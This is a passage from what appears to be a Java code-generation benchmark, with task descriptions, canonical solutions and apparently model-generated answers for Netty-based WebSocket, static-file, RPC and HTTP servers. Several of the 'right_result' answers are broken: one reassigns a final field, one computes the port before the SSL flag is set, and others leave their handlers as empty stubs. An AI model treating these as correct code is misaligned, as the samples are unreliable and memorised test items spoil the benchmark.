}\n        }\n\n        @Override\n        public void onBinaryMessage(ChannelHandlerContext ctx, byte[] data) {\n            int headlen = (data[1] & 0xFF) << 8 | (data[0] & 0xFF);\n            String infoJSON = new String(data, 2, headlen);\n            BinaryMessage message = BinaryMessage.parse(infoJSON);\n\n            if (message.getType().equals(\"file\")) {\n                FileMessage fileMessage = (FileMessage) message;\n                File file = Constant.getTmpFile(fileMessage.name);\n                if (fileMessage.offset == 0 && file.exists()) {\n                    file.delete();\n                }\n                try {\n                    FileOutputStream os = new FileOutputStream(file, true);\n                    byte[] bs = Arrays.copyOfRange(data, 2 + headlen, data.length);\n                    os.write(bs);\n                    os.close();\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n                if (fileMessage.offset + fileMessage.packagesize == fileMessage.filesize) {\n                    ctx.channel().writeAndFlush(new TextWebSocketFrame(\"message://upload file success\"));\n                }\n            }\n        }\n\n        void initLocalClient(final ChannelHandlerContext ctx, Command command) {\n            String sn = command.getString(\"sn\", null);\n            String key = command.getString(\"key\", null);\n\n            if (StringUtils.isEmpty(sn)) {\n                AdbDevice iDevice = AdbServer.server().getFirstDevice();\n                if (iDevice == null) {\n                    ctx.channel().close();\n                    return;\n                }\n                sn = iDevice.getIDevice().getSerialNumber();\n            }\n\n            JSONObject obj = new JSONObject();\n            obj.put(\"sn\", sn);\n            obj.put(\"key\", key);\n\n            ctx.channel().writeAndFlush(new TextWebSocketFrame(\"open://\" + obj.toJSONString()));\n\n            Protocol protocol = new Protocol();\n            protocol.setSn(sn);\n            protocol.setKey(key);\n            protocol.setBroswerSocket(ctx);\n            protocolList.add(protocol);\n\n            LocalClient localClient = new LocalClient(protocol);\n            protocol.setLocalClient(localClient);\n        }\n\n        void executeCommand(ChannelHandlerContext ctx, Command command) {\n            Protocol protocol = null;\n            for (Protocol p : protocolList) {\n                if (p.getBroswerSocket() != null && p.getBroswerSocket() == ctx) {\n                    protocol = p;\n                    break;\n                }\n                if (p.getClientSocket() != null && p.getClientSocket() == ctx) {\n                    protocol = p;\n                    break;\n                }\n            }\n            if (protocol != null) {\n                protocol.getLocalClient().executeCommand(ctx, command);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.codec.http.websocketx.WebSocketServerProtocolHandler;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class LocalServer {\n    private final int port;\n    private final List<Protocol> protocolList = new ArrayList<>();\n    private static final Logger logger = LoggerFactory.getLogger(LocalServer.class);\n\n    public LocalServer(int port) {\n        this.port = port;\n    }\n\n    public void listen(int port) {\n        this.port = port;\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) throws Exception {\n                            ChannelPipeline pipeline = ch.pipeline();\n                            pipeline.addLast(new HttpServerCodec());\n                            pipeline.addLast(new HttpObjectAggregator(65536));\n                            pipeline.addLast(new WebSocketServerProtocolHandler(\"/ws\"));\n                            pipeline.addLast(new LocalServerWebsocketEventImp());\n                        }\n                    })\n                    .option(ChannelOption.SO_BACKLOG, 128)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    private class LocalServerWebsocketEventImp extends SimpleChannelInboundHandler<Object> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, Object msg) throws Exception {\n            if (msg instanceof io.netty.handler.codec.http.websocketx.TextWebSocketFrame) {\n                onTextMessage(ctx, ((io.netty.handler.codec.http.websocketx.TextWebSocketFrame) msg).text());\n            } else if (msg instanceof io.netty.handler.codec.http.websocketx.BinaryWebSocketFrame) {\n                onBinaryMessage(ctx, ((io.netty.handler.codec.http.websocketx.BinaryWebSocketFrame) msg).content().array());\n            }\n        }\n\n        private void onConnect(ChannelHandlerContext ctx) {\n            // Handle new WebSocket connection\n        }\n\n        private void onDisconnect(ChannelHandlerContext ctx) {\n            // Handle client disconnection and cleanup\n        }\n\n        private void onTextMessage(ChannelHandlerContext ctx, String text) {\n            // Process incoming text messages and execute corresponding commands\n        }\n\n        private void onBinaryMessage(ChannelHandlerContext ctx, byte[] data) {\n            // Handle binary file uploads and process file chunks\n        }\n\n        private void initLocalClient(ChannelHandlerContext ctx, Command command) {\n            // Initialize a new client protocol for device communication\n        }\n\n        private void executeCommand(ChannelHandlerContext ctx, Command command) {\n            // Execute commands on the appropriate protocol instance\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 161,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle HTTP requests for static file serving, with optional SSL support.\n\nClass Description: HttpStaticFileServer is a Netty-based server that serves static files over HTTP or HTTPS. It uses a boss-worker thread model for handling connections and includes SSL configuration capabilities.\n\nAttributes:\n- SSL: [boolean] - Flag indicating whether SSL/TLS encryption should be enabled\n- PORT: [int] - The port number on which the server will listen (defaults to 8080 for HTTP or 8443 for HTTPS)\n\nMethods:\n- start(): [void] - Starts the Netty server with the configured settings. Throws Exception if startup fails.\n  - Input: None\n  - Output: None (but binds to specified port and starts serving requests)\n  - Side effects: Creates event loop groups, binds to port, and keeps server running until shutdown",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.SslProvider;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class HttpStaticFileServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", SSL? \"8443\" : \"8080\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey())\n                .sslProvider(SslProvider.JDK).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new HttpStaticFileServerInitializer(sslCtx));\n\n            Channel ch = b.bind(PORT).sync().channel();\n\n            System.err.println(\"Open your web browser and navigate to \" +\n                    (SSL? \"https\" : \"http\") + \"://127.0.0.1:\" + PORT + '/');\n\n            ch.closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic class HttpStaticFileServer {\n    private boolean ssl;\n    private int port = ssl ? 8443 : 8080;\n\n    public HttpStaticFileServer(boolean ssl) {\n        this.ssl = ssl;\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     if (ssl) {\n                         SslContext sslCtx = SslContextBuilder.forServer(new SelfSignedCertificate()).build();\n                         p.addLast(sslCtx.newHandler(ch.alloc()));\n                     }\n                     p.addLast(new HttpServerCodec());\n                     p.addLast(new HttpObjectAggregator(65536));\n                     p.addLast(new StaticFileHandler());\n                 }\n             });\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        boolean ssl = false; // Set to true to enable SSL\n        HttpStaticFileServer server = new HttpStaticFileServer(ssl);\n        server.start();\n    }\n}\n```"
  },
  {
    "Task_id": 162,
    "Instruction": "Task Description: Implement a Netty-based TCP server for RPC (Remote Procedure Call) communication that handles incoming client connections, processes RPC requests, and manages server resources efficiently.\n\nClass Description: NettyRpcServer is a Spring component that establishes a TCP server using Netty framework to handle RPC communications. It manages service registration, client connections, and provides graceful shutdown capabilities.\n\nAttributes:\n- PORT: [int] - The port number on which the server listens for incoming connections (default: 9998).\n- serviceProvider: [ServiceProvider] - An instance responsible for managing and providing registered RPC services (singleton instance of ZkServiceProviderImpl).\n\nMethods:\n- start(): [void] - Initializes and starts the Netty TCP server. Configures event loop groups, server bootstrap, channel pipeline with handlers for encoding/decoding RPC messages, and idle state detection. Binds to the specified host and port, and keeps the server running until shutdown.\n  Input: None\n  Output: None\n\n- registerService(RpcServiceConfig rpcServiceConfig): [void] - Registers an RPC service with the service provider.\n  Input: rpcServiceConfig [RpcServiceConfig] - Configuration object containing RPC service details to be registered.\n  Output: None",
    "Canonical_solution": "import github.javaguide.config.CustomShutdownHook;\nimport github.javaguide.config.RpcServiceConfig;\nimport github.javaguide.factory.SingletonFactory;\nimport github.javaguide.provider.ServiceProvider;\nimport github.javaguide.provider.impl.ZkServiceProviderImpl;\nimport github.javaguide.remoting.transport.netty.codec.RpcMessageDecoder;\nimport github.javaguide.remoting.transport.netty.codec.RpcMessageEncoder;\nimport github.javaguide.utils.RuntimeUtil;\nimport github.javaguide.utils.concurrent.threadpool.ThreadPoolFactoryUtil;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport io.netty.util.concurrent.DefaultEventExecutorGroup;\nimport lombok.SneakyThrows;\nimport lombok.extern.slf4j.Slf4j;\nimport org.springframework.stereotype.Component;\n\nimport java.net.InetAddress;\nimport java.util.concurrent.TimeUnit;\n\n@Slf4j\n@Component\npublic class NettyRpcServer {\n\n    public static final int PORT = 9998;\n\n    private final ServiceProvider serviceProvider = SingletonFactory.getInstance(ZkServiceProviderImpl.class);\n\n    @SneakyThrows\n    public void start() {\n        CustomShutdownHook.getCustomShutdownHook().clearAll();\n        String host = InetAddress.getLocalHost().getHostAddress();\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        DefaultEventExecutorGroup serviceHandlerGroup = new DefaultEventExecutorGroup(\n                RuntimeUtil.cpus() * 2,\n                ThreadPoolFactoryUtil.createThreadFactory(\"service-handler-group\", false)\n        );\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .childOption(ChannelOption.TCP_NODELAY, true)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true)\n                    .option(ChannelOption.SO_BACKLOG, 128)\n                    .handler(new LoggingHandler(LogLevel.INFO))\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            ChannelPipeline p = ch.pipeline();\n                            p.addLast(new IdleStateHandler(30, 0, 0, TimeUnit.SECONDS));\n                            p.addLast(new RpcMessageEncoder());\n                            p.addLast(new RpcMessageDecoder());\n                            p.addLast(serviceHandlerGroup, new NettyRpcServerHandler());\n                        }\n                    });\n\n            ChannelFuture f = b.bind(host, PORT).sync();\n            f.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            log.error(\"occur exception when start server:\", e);\n        } finally {\n            log.error(\"shutdown bossGroup and workerGroup\");\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n            serviceHandlerGroup.shutdownGracefully();\n        }\n    }\n\n    public void registerService(RpcServiceConfig rpcServiceConfig) {\n        serviceProvider.publishService(rpcServiceConfig);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.LengthFieldBasedFrameDecoder;\nimport io.netty.handler.codec.LengthFieldPrepender;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Component;\n\n@Component\npublic class NettyRpcServer {\n\n    private static final int PORT = 9998;\n    @Autowired\n    private ServiceProvider serviceProvider;\n\n    public void start() {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) throws Exception {\n                            ChannelPipeline p = ch.pipeline();\n                            p.addLast(new LengthFieldBasedFrameDecoder(Integer.MAX_VALUE, 0, 4, 0, 4));\n                            p.addLast(new LengthFieldPrepender(4));\n                            p.addLast(new IdleStateHandler(60, 30, 0));\n                            p.addLast(new RpcRequestHandler(serviceProvider));\n                        }\n                    })\n                    .option(ChannelOption.SO_BACKLOG, 128)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public void registerService(RpcServiceConfig rpcServiceConfig) {\n        serviceProvider.register(rpcServiceConfig);\n    }\n}\n```"
  },
  {
    "Task_id": 163,
    "Instruction": "Task Description: Implement a Netty-based TCP server class that can handle incoming client connections, support SSL/TLS encryption, and provide graceful shutdown capabilities.\n\nClass Description: The NettyServer class is responsible for creating and managing a TCP server using Netty framework. It handles server initialization, SSL configuration (if enabled), thread pool management, and proper resource cleanup during shutdown.\n\nAttributes:\n- blade: [Blade] - Reference to the Blade framework instance for web application context\n- environment: [Environment] - Configuration environment containing server settings\n- bossGroup: [EventLoopGroup] - Netty event loop group for accepting connections\n- workerGroup: [EventLoopGroup] - Netty event loop group for handling I/O operations\n- channel: [Channel] - Netty channel representing the server socket\n- DEFAULT_ACCEPT_THREAD_COUNT: [int] - Default number of threads for accepting connections\n- DEFAULT_IO_THREAD_COUNT: [int] - Default number of threads for I/O operations\n\nMethods:\n- startServer(): [void] -> [void] - Starts the Netty server with configured settings, including optional SSL/TLS setup. Reads configuration from environment and initializes thread pools.\n- stop(): [void] -> [void] - Gracefully shuts down the server by releasing all thread pool resources and closing the server channel.",
    "Canonical_solution": "import com.hellokaton.blade.Blade;\nimport com.hellokaton.blade.Environment;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoop;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport lombok.extern.slf4j.Slf4j;\n\nimport static com.hellokaton.blade.kit.BladeKit.getStartedSymbol;\nimport static com.hellokaton.blade.mvc.BladeConst.*;\n\n@Slf4j\npublic class NettyServer {\n\n    private Blade blade;\n    private Environment environment;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private Channel channel;\n\n    private static final int DEFAULT_ACCEPT_THREAD_COUNT = 1;\n    private static final int DEFAULT_IO_THREAD_COUNT = 0;\n\n    public void startServer() throws Exception {\n        boolean SSL = environment.getBoolean(ENV_KEY_SSL, false);\n        SslContext sslCtx = null;\n        if (SSL) {\n            String certFilePath = environment.get(ENV_KEY_SSL_CERT, null);\n            String privateKeyPath = environment.get(ENV_KEY_SSL_PRIVATE_KEY, null);\n            String privateKeyPassword = environment.get(ENV_KEY_SSL_PRIVATE_KEY_PASS, null);\n            \n            log.info(\"{}SSL CertChainFile  Path: {}\", getStartedSymbol(), certFilePath);\n            log.info(\"{}SSL PrivateKeyFile Path: {}\", getStartedSymbol(), privateKeyPath);\n            sslCtx = SslContextBuilder.forServer(new File(certFilePath), new File(privateKeyPath), privateKeyPassword).build();\n        }\n\n        ServerBootstrap bootstrap = new ServerBootstrap();\n\n        int acceptThreadCount = environment.getInt(ENV_KEY_NETTY_ACCEPT_THREAD_COUNT, DEFAULT_ACCEPT_THREAD_COUNT);\n        int ioThreadCount = environment.getInt(ENV_KEY_NETTY_IO_THREAD_COUNT, DEFAULT_IO_THREAD_COUNT);\n\n        this.bossGroup = new NioEventLoopGroup(acceptThreadCount, new NamedThreadFactory(\"boss@\"));\n        this.workerGroup = new NioEventLoopGroup(ioThreadCount, new NamedThreadFactory(\"worker@\"));\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childOption(ChannelOption.TCP_NODELAY, environment.getBoolean(ENV_KEY_NETTY_TCP_NODELAY, true))\n                .childOption(ChannelOption.SO_KEEPALIVE, environment.getBoolean(ENV_KEY_NETTY_SO_KEEPALIVE, true))\n                .childHandler(new HttpServerInitializer(sslCtx, blade));\n\n        String address = environment.get(ENV_KEY_SERVER_ADDRESS, DEFAULT_SERVER_ADDRESS);\n        Integer port = environment.getInt(ENV_KEY_SERVER_PORT, DEFAULT_SERVER_PORT);\n\n        channel = bootstrap.bind(address, port).sync().channel();\n    }\n\n    public void stop() {\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully();\n        }\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic class NettyServer {\n    private Blade blade;\n    private Environment environment;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private Channel channel;\n    private static final int DEFAULT_ACCEPT_THREAD_COUNT = 1;\n    private static final int DEFAULT_IO_THREAD_COUNT = Runtime.getRuntime().availableProcessors() * 2;\n\n    public void startServer() throws Exception {\n        int acceptThreadCount = environment.getProperty(\"server.accept.thread.count\", Integer.class, DEFAULT_ACCEPT_THREAD_COUNT);\n        int ioThreadCount = environment.getProperty(\"server.io.thread.count\", Integer.class, DEFAULT_IO_THREAD_COUNT);\n        boolean sslEnabled = environment.getProperty(\"server.ssl.enabled\", Boolean.class, false);\n\n        bossGroup = new NioEventLoopGroup(acceptThreadCount);\n        workerGroup = new NioEventLoopGroup(ioThreadCount);\n\n        ServerBootstrap b = new ServerBootstrap();\n        b.group(bossGroup, workerGroup)\n         .channel(NioServerSocketChannel.class)\n         .childHandler(new ChannelInitializer<SocketChannel>() {\n             @Override\n             protected void initChannel(SocketChannel ch) throws Exception {\n                 ChannelPipeline p = ch.pipeline();\n                 if (sslEnabled) {\n                     SslContext sslCtx = SslContextBuilder.forServer(new SelfSignedCertificate()).build();\n                     p.addLast(sslCtx.newHandler(ch.alloc()));\n                 }\n                 // Add other handlers here\n             }\n         });\n\n        channel = b.bind(environment.getProperty(\"server.port\", Integer.class)).sync().channel();\n    }\n\n    public void stop() {\n        if (channel != null) {\n            channel.closeFuture().syncUninterruptibly();\n        }\n        workerGroup.shutdownGracefully();\n        bossGroup.shutdownGracefully();\n    }\n}\n```"
  },
  {
    "Task_id": 164,
    "Instruction": "Task Description: Create a Java class that implements an HTTP server using Netty framework, capable of handling HTTP requests with configurable thread pool settings and connection management.\n\nClass Description: Netty4HttpServer is a Netty-based HTTP server implementation that handles incoming HTTP requests using configurable worker threads and connection pooling. It extends AbstractServer and implements StatisticCallback for monitoring purposes.\n\nAttributes:\n- httpMessageHandler: HttpMessageHandler - Handler for processing HTTP requests\n- url: URL - Server configuration URL containing parameters like port, thread settings\n- channel: Channel - Netty channel for server communication\n- bossGroup: EventLoopGroup - Netty event loop group for accepting connections\n- workerGroup: EventLoopGroup - Netty event loop group for handling I/O operations\n- standardThreadExecutor: StandardThreadExecutor - Thread pool for request processing\n\nMethods:\n- open() -> boolean - Initializes and starts the HTTP server, returns true if successful\n  Input: None\n  Output: boolean indicating success/failure of server startup\n\n- close(int timeout) -> void - Shuts down the server gracefully within specified timeout\n  Input: timeout - maximum time to wait for shutdown (in milliseconds)\n  Output: None\n\n- processHttpRequest(ChannelHandlerContext ctx, FullHttpRequest httpRequest) -> void - Processes incoming HTTP requests\n  Input: \n    ctx - ChannelHandlerContext for the connection\n    httpRequest - Full HTTP request object\n  Output: None\n\n- sendResponse(ChannelHandlerContext ctx, FullHttpResponse httpResponse) -> void - Sends HTTP response to client\n  Input:\n    ctx - ChannelHandlerContext for the connection\n    httpResponse - Full HTTP response object\n  Output: None\n\n- getUrl() -> URL - Returns server configuration URL\n  Input: None\n  Output: URL object containing server configuration",
    "Canonical_solution": "import com.weibo.api.motan.common.ChannelState;\nimport com.weibo.api.motan.common.MotanConstants;\nimport com.weibo.api.motan.common.URLParamType;\nimport com.weibo.api.motan.core.DefaultThreadFactory;\nimport com.weibo.api.motan.core.StandardThreadExecutor;\nimport com.weibo.api.motan.exception.MotanFrameworkException;\nimport com.weibo.api.motan.rpc.Request;\nimport com.weibo.api.motan.rpc.Response;\nimport com.weibo.api.motan.rpc.URL;\nimport com.weibo.api.motan.transport.AbstractServer;\nimport com.weibo.api.motan.transport.TransportException;\nimport com.weibo.api.motan.util.LoggerUtil;\nimport com.weibo.api.motan.util.StatisticCallback;\nimport com.weibo.api.motan.util.StatsUtil;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.stream.ChunkedWriteHandler;\n\nimport java.net.InetSocketAddress;\n\npublic class Netty4HttpServer extends AbstractServer implements StatisticCallback {\n    private HttpMessageHandler httpMessageHandler;\n    private URL url;\n    private Channel channel;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private StandardThreadExecutor standardThreadExecutor;\n\n    public Netty4HttpServer(URL url, HttpMessageHandler httpMessageHandler) {\n        this.url = url;\n        this.httpMessageHandler = httpMessageHandler;\n    }\n\n    @Override\n    public synchronized boolean open() {\n        if (isAvailable()) {\n            return true;\n        }\n        if (channel != null) {\n            channel.close();\n        }\n        if (bossGroup == null) {\n            bossGroup = new NioEventLoopGroup();\n            workerGroup = new NioEventLoopGroup();\n        }\n        boolean shareChannel = url.getBooleanParameter(URLParamType.shareChannel.getName(), URLParamType.shareChannel.getBooleanValue());\n        int workerQueueSize = url.getIntParameter(URLParamType.workerQueueSize.getName(), 500);\n\n        int minWorkerThread, maxWorkerThread;\n\n        if (shareChannel) {\n            minWorkerThread = url.getIntParameter(URLParamType.minWorkerThread.getName(), MotanConstants.NETTY_SHARECHANNEL_MIN_WORKDER);\n            maxWorkerThread = url.getIntParameter(URLParamType.maxWorkerThread.getName(), MotanConstants.NETTY_SHARECHANNEL_MAX_WORKDER);\n        } else {\n            minWorkerThread =\n                    url.getIntParameter(URLParamType.minWorkerThread.getName(), MotanConstants.NETTY_NOT_SHARECHANNEL_MIN_WORKDER);\n            maxWorkerThread =\n                    url.getIntParameter(URLParamType.maxWorkerThread.getName(), MotanConstants.NETTY_NOT_SHARECHANNEL_MAX_WORKDER);\n        }\n        final int maxContentLength = url.getIntParameter(URLParamType.maxContentLength.getName(), URLParamType.maxContentLength.getIntValue());\n        standardThreadExecutor = (standardThreadExecutor != null && !standardThreadExecutor.isShutdown()) ? standardThreadExecutor\n                : new StandardThreadExecutor(minWorkerThread, maxWorkerThread, workerQueueSize, new DefaultThreadFactory(\"NettyServer-\" + url.getServerPortStr(), true));\n        standardThreadExecutor.prestartAllCoreThreads();\n\n        ServerBootstrap b = new ServerBootstrap();\n        b.group(bossGroup, workerGroup).channel(NioServerSocketChannel.class).childHandler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            public void initChannel(SocketChannel ch) {\n                ch.pipeline().addLast(\"http-decoder\", new HttpRequestDecoder());\n                ch.pipeline().addLast(\"http-aggregator\", new HttpObjectAggregator(maxContentLength));\n                ch.pipeline().addLast(\"http-encoder\", new HttpResponseEncoder());\n                ch.pipeline().addLast(\"http-chunked\", new ChunkedWriteHandler());\n                ch.pipeline().addLast(\"serverHandler\", new SimpleChannelInboundHandler<FullHttpRequest>() {\n                    protected void channelRead0(final ChannelHandlerContext ctx, final FullHttpRequest httpRequest) {\n                        httpRequest.content().retain();\n                        try {\n                            standardThreadExecutor.execute(() -> processHttpRequest(ctx, httpRequest));\n                        } catch (Exception e) {\n                            LoggerUtil.error(\"request is rejected by threadPool!\", e);\n                            httpRequest.content().release();\n                            sendResponse(ctx, NettyHttpUtil.buildErrorResponse(\"request is rejected by thread pool!\"));\n                        }\n                    }\n                });\n            }\n        }).option(ChannelOption.SO_BACKLOG, 1024).childOption(ChannelOption.SO_KEEPALIVE, false);\n\n        ChannelFuture f;\n        try {\n            f = b.bind(url.getPort()).sync();\n            channel = f.channel();\n        } catch (InterruptedException e) {\n            LoggerUtil.error(\"init http server fail.\", e);\n            return false;\n        }\n        setLocalAddress((InetSocketAddress) channel.localAddress());\n        if (url.getPort() == 0) {\n            url.setPort(getLocalAddress().getPort());\n        }\n        state = ChannelState.ALIVE;\n        StatsUtil.registryStatisticCallback(this);\n        LoggerUtil.info(\"Netty4HttpServer ServerChannel finish Open: url=\" + url);\n        return true;\n    }\n\n    private void processHttpRequest(ChannelHandlerContext ctx, FullHttpRequest httpRequest) {\n        FullHttpResponse httpResponse;\n        try {\n            httpRequest.headers().set(URLParamType.host.getName(), ((InetSocketAddress) ctx.channel().remoteAddress()).getAddress().getHostAddress());\n            httpResponse = httpMessageHandler.handle(this, httpRequest);\n        } catch (Exception e) {\n            LoggerUtil.error(\"NettyHttpHandler process http request fail.\", e);\n            httpResponse = NettyHttpUtil.buildErrorResponse(e.getMessage());\n        } finally {\n            httpRequest.content().release();\n        }\n        sendResponse(ctx, httpResponse);\n    }\n\n    private void sendResponse(ChannelHandlerContext ctx, FullHttpResponse httpResponse) {\n        boolean close = false;\n        try {\n            ctx.write(httpResponse);\n            ctx.flush();\n        } catch (Exception e) {\n            LoggerUtil.error(\"NettyHttpHandler write response fail.\", e);\n            close = true;\n        } finally {\n            if (close || httpResponse == null || !httpResponse.headers().contains(HttpHeaderNames.CONNECTION, HttpHeaderValues.KEEP_ALIVE, true)) {\n                ctx.close();\n            }\n        }\n    }\n\n    @Override\n    public synchronized void close(int timeout) {\n        if (state.isCloseState()) {\n            LoggerUtil.info(\"Netty4HttpServer close fail: already close, url={}\", url.getUri());\n            return;\n        }\n\n        if (state.isUnInitState()) {\n            LoggerUtil.info(\"Netty4HttpServer close Fail: don't need to close because node is unInit state: url={}\",\n                    url.getUri());\n            return;\n        }\n        if (channel != null) {\n            channel.close();\n        }\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully();\n        }\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n        if (standardThreadExecutor != null) {\n            standardThreadExecutor.shutdownNow();\n        }\n        workerGroup = null;\n        bossGroup = null;\n        